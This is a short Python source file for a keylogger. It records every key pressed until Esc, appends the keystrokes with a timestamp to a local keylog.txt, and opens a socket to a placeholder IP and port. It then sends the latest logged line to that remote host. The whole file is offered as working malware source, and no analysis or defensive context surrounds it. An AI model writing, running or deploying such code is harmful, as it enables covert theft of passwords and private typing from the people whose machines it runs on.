import keyboard
import datetime
import socket


def connect():
    ip = 'IP'
    port = 'PORT'
    s = socket.socket()
    s.connect((ip, port))
    return s


def write_to_file(recorded):
    f = open('keylog.txt', 'a', encoding='utf-8')
    f.write(str(datetime.datetime.now()) + ': ')
    for key in recorded:
        if len(key.name) > 1:
            if key.name == 'space': 
                f.write(' ')
            else:
                f.write('[' + key.name + ']')
        else: 
            f.write(key.name + '')
    f.write('\n')
    f.close()


def send_to_server(connection):
    with open('keylog.txt', 'r') as f:
        lines = f.readlines()
        connection.send(lines[-1].encode('utf-8'))
    connection.close()


recorded = keyboard.record(until='esc')
recorded = [event for event in recorded if event.event_type == 'down'][:-1]

connection = connect()
write_to_file(recorded)
send_to_server(connection)
